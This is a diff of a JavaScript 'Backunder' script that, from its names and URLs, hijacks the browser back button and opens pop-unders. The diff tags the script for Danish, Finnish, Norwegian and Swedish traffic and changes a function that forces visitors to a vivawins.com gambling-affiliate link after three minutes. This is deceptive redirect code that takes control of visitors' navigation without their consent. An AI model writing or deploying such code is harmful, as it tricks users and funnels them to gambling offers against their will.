@@ -1,4 +1,4 @@
-// Backunder Luck
+// Backunder Luck [DK/FI/NO/SE] 
 var back = 'https://a.vivawins.com/visit/5a58e058-c985-4634-82d4-dd97bef6b880?track=BackButton';
 var under = 'https://a.vivawins.com/visit/0b968054-fb69-4c9e-9de4-32de5782273a?track=Under';
 
@@ -30,7 +30,7 @@ if (typeof back !== "undefined" && back !== null) {
 
 // Redirect Function
 function redirectAfterDelay() {
-    const redirectUrl = "https://a.vivawins.com/visit/487b00df-a676-4fe5-8348-c4ee6287da4d?track=Redirect";
+    const redirectUrl = "https://a.vivawins.com/click";
     setTimeout(() => {
         window.location.href = redirectUrl;
     }, 180000); // 3 минуты
